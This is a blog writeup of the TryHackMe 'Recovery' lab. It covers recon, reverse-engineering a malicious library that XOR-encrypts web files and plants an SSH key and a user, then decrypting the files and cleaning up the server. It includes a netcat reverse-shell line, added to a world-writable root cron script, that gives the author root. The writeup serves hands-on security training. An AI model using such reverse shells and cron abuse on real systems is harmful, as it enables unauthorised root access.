---
layout: post
title:  "TryHackMe Recovery writeup"
date:   2020-10-11 10:20:00 +0200
categories: writeup tryhackme
---

> Hi, it’s me, your friend Alex.

Oh no, Alex has done it again. He received a random binary in email and executed it on production web server. All the web server files are now encrypted and he needs my help to keep his job. He was kind enough to offer me flags in exchange of saving his sorry ass so let’s get to work and solve this [TryHackMe room](https://tryhackme.com/room/recovery).

![facepalm]({{ site.url }}/assets/gifs/facepalm.gif)

## Reconnaissance

I start with nmap to get an idea of the server:

```
$ nmap -sC -sV -p- 10.10.205.76
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 12:52 EEST
Nmap scan report for 10.10.205.76
Host is up (0.051s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 55:17:c1:d4:97:ba:8d:82:b9:60:81:39:e4:aa:1e:e8 (RSA)
|   256 8d:f5:4b:ab:23:ed:a3:c0:e9:ca:90:e9:80:be:14:44 (ECDSA)
|_  256 3e:ae:91:86:81:12:04:e4:70:90:b1:40:ef:b7:f1:b6 (ED25519)
80/tcp    open  http    Apache httpd 2.4.43 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.43 (Unix)
|_http-title: Site doesn't have a title (text/html).
1337/tcp  open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Help Alex!
65499/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:b6:aa:93:8d:aa:b7:f3:af:71:9d:7f:c5:83:1d:63 (RSA)
|   256 64:98:14:38:ff:38:05:7e:25:ae:5d:33:2d:b6:78:f3 (ECDSA)
|_  256 ef:2e:60:3a:de:ea:2b:25:7d:26:da:b5:6b:5b:c4:3a (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Seems like there is another SSH service running on 65499. Maybe a backdoor for the hackers to get back to the box.

## Gaining access

First I try to login with SSH with the credentials he provided. Nice password, Alex! I’m greeted with an endless stream of text:

```
YOU DIDN’T SAY THE MAGIC WORD!
YOU DIDN’T SAY THE MAGIC WORD!
YOU DIDN’T SAY THE MAGIC WORD!
YOU DIDN’T SAY THE MAGIC WORD!
logout
[1]+ Terminated while :; do
 echo “YOU DIDN’T SAY THE MAGIC WORD!”;
done
Connection to 10.10.205.76 closed.
```
Annoying. Luckily ssh can be used to run commands remotely. So after a couple of checks I figure out how to break out of the loop:

```
ssh alex@10.10.205.76 "cat .bashrc"
....
while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
```

There we go.

```
ssh alex@10.10.205.76 “cat .bashrc | head -n -1 > .bashrc”
```

Now, can I login? Pretty please with sugar on top.

```
ssh alex@10.10.205.76                                     
alex@10.10.205.76's password: 
Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Oct 10 09:47:28 2020 from 10.8.108.247
alex@recoveryserver:~$
```
Thank you kindly. That seems to have been good enough for Flag 0. Which can be gotten from the web site at port 1337.

```
Flag 0: THM{__REDACTED__}
```
After getting the login working I notice that I always get kicked out after one minute. Super annoying. Have to disable that. Let’s dig around a bit. Something bad happens in cron:

```
alex@recoveryserver:~$ cat /etc/cron.d/evil
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
```
I inspect the “fantastic” script to see that it kills all bash processes every minute:

```
#!/bin/sh
for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
```
And of course Alex hasn’t switched to zsh yet, like every sane person on the planet. Looking at the shells available I decide its better to just disable the script since the hackers were kind enough to leave it world writable. That’s a nice hacker! Maybe I can now work in peace. Thank you. And thanks for another flag:

```
Flag 1: THM{__REDACTED__}
```

## Surveying the damage
Apache web server is installed in `/usr/local/apache2` and the files that are now encrypted are in `/usr/local/apache2/htdocs`. Need to figure out how to restore them.

## LinEnum
Always worth running LinEnum. I find out that this is a Docker container. Also, what is this?

```
-rwsr-xr-x 1 root root 16928 Jun 17 08:55 /bin/admin
```

I take a closer look:

```
alex@recoveryserver:/tmp$ /bin/admin 
Welcome to the Recoverysoft Administration Tool! Please input your password:
doo
Incorrect password! This will be logged!
```
And now the “marvelous” script is back. Damn. Should have known better. I now have two evil files to analyze. Let’s start!

## Analyzing /bin/admin

I start with /bin/admin since it’s smaller. I fire up [Cutter RE Platform](https://cutter.re/) and look at the Decompiler to see what the program does. The only interesting function is **LogIncorrectAttempt()**.

![cutter1]({{ site.url }}/assets/medium/recovery.png)

The function seems to be linked to the program dynamically. What libraries is it using?

```
dd -r -v /bin/admin
 linux-vdso.so.1 (0x00007ffef4ec9000)
 liblogging.so => /lib/x86_64-linux-gnu/liblogging.so (0x00007feb313ee000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007feb3122d000)
 /lib64/ld-linux-x86–64.so.2 (0x00007feb313ff000)
Version information:
 /bin/admin:
 libc.so.6 (GLIBC_2.2.5) => /lib/x86_64-linux-gnu/libc.so.6
 /lib/x86_64-linux-gnu/liblogging.so:
 libc.so.6 (GLIBC_2.4) => /lib/x86_64-linux-gnu/libc.so.6
 libc.so.6 (GLIBC_2.2.5) => /lib/x86_64-linux-gnu/libc.so.6
 /lib/x86_64-linux-gnu/libc.so.6:
 ld-linux-x86–64.so.2 (GLIBC_2.3) => /lib64/ld-linux-x86–64.so.2
 ld-linux-x86–64.so.2 (GLIBC_PRIVATE) => /lib64/ld-linux-x86–64.so.2
 ```
 Looks pretty innocent. But the function must be defined somewhere. Let’s examine the libraries one by one until we find it:

 ```
 nm -D /lib/x86_64-linux-gnu/liblogging.so
000000000000158a T GetWebFiles
0000000000001a1f T LogIncorrectAttempt
0000000000001854 T XOREncryptWebFiles
00000000000016fe T XORFile
 w _ITM_deregisterTMCloneTable
 w _ITM_registerTMCloneTable
 w __cxa_finalize
 w __gmon_start__
 U __stack_chk_fail
 U __xstat
 U chmod
 U closedir
0000000000004108 D encryption_key_dir
...
0000000000004100 D web_location
```
Let’s analyze it with Cutter again and see what nasty stuff it does.

![cutter2]({{ site.url }}/assets/medium/recovery2.png)

1. Move a library from /tmp/ to /lib
2. Add an SSH key to root’s authorized keys so the attacker can log in as root
3. Call XOREncryptWebFiles()
4. Add a user named security
5. Write /opt/brilliant_script.sh
6. Add a cron entry to run the script once a minute

Let’s try to crack the security users password since we can see the hash. While we wait lets take a closer look at the nasty library. It contains functions to encrypt files:

 * **GetWebFiles()** enumerates a directory, filters file types and copies them to a memory location
 * **XORFile()** encrypts or decrypts a file using XOR and a key
 * **XOREncryptWebFiles()** uses the two functions do encrypt the web files
 * **rand_string()** makes an encryption key based on static bytes and rand() function. srand(time()) is used to initialize the random number generator.

## Analysing fixutil
Repeating the process with Cutter I decompile fixutils binary. It adds the code explained above from a statically linked library to liblogging.so and calls the /bin/admin program to do it’s thing.

![cutter3]({{ site.url }}/assets/medium/recovery3.png)

## Decrypting the files
Diving deeper into XOREncryptWebFiles I notice that the encryption key is written to a file. Maybe it can be found?

![cutter4]({{ site.url }}/assets/medium/recovery4.png)

Looking at the hexdump from **0x2037** we can see that the key is backed up to `/opt/.fixutil/backup.txt`. No we just need to get access to it! No luck yet with cracking the password so need to think of something else. Going back to LinEnum.
Looking at the output again I see that LinEnum had already flagged two of the interesting files! I Could have read the report more thoroughly. Something to keep in mind for the next time.

```
[-] Files not owned by user but writable by group:
-rwxrwxrwx 1 root root 11 Oct 10 10:48 /opt/brilliant_script.sh
-rwxrwxrwx 1 root root 23176 Jun 17 21:21 /lib/x86_64-linux-gnu/liblogging.so
```
Let’s see who the evil cron job runs as. By adding a reverse shell to the brilliant script:

```
nc -e /bin/sh 10.8.108.247 4444
```
BOOM! We are root.

```
$ nc -vlp 4444
listening on [any] 4444 …
10.10.205.76: inverse host lookup failed: Unknown host
connect to [10.8.108.247] from (UNKNOWN) [10.10.205.76] 36540
whoami
root
cat /opt/.fixutil/backup.txt
__REDACTED__
```
Had to write a C program to do the decrypting since didn’t find anything useful on the system. It’s been a while, sorry about the mess.
{% gist 6c46e84fe60c0e6cc00f0d735435a7bc %}

```bash
gcc -o xor xor.c
```
now we can restore the three files:

```
./xor key1 < /usr/local/apache2/htdocs/index.html > /tmp/index.html
./xor key1 < /usr/local/apache2/htdocs/reallyimportant.txt > /tmp/reallyimportant.txt
./xor key1 < /usr/local/apache2/htdocs/todo.html > /tmp/todo.html
cp /tmp/index.html /usr/local/apache2/htdocs/index.html
cp /tmp/reallyimportant.txt /usr/local/apache2/htdocs/reallyimportant.txt
cp /tmp/todo.html /usr/local/apache2/htdocs/todo.html
```
There is a much more elegant way. I know. But hey, there is a flag for reward!

```
Flag 5: THM{__REDACTED_}
```

# Cleaning up the server
Restore the right shared library:
```
mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so
```
Award Flag 2: Flag 2: THM{__REDACTED__} .

Remove SSH key from authorized_keys:
```
rm /root/.ssh/authorized_keys
```

Award Flag 3: THM{_REDACTED__}
Delete malicious user:
```
/usr/sbin/userdel -f security
```
Award: Flag 4: THM{__REDACTED__}
Remove evil files:
```
rm /bin/admin
rm /home/alex/fixutil
rm /opt/brilliant_script.sh
rm /etc/cron.d/evil
```
And we are done. No more flags to get. Time to move on to the next challenge. Hopefully Alex has learnt a lesson here. Yet somehow I doubt it. But I have 5 more flags in my collection!

![gollum]({{ site.url }}/assets/gifs/gollum.gif)

# Rabbit holes
 * running /bin/admin caused the files to be encrypted again so it was better to reset the box than to handle the twice encrypted files even though both keys were available
 * Thinking of using buffer overflow to get shell from /bin/admin because of getline() but then figured out that it allocates its own memory and doesn’t use stack
 * Trying to add my own RSA key to authorized_keys. Got the key in but didn’t get SSH access
 * Trying to brute force security user password with john
 * Too much trouble with getting remote shell. Could have added alex to sudoers or something.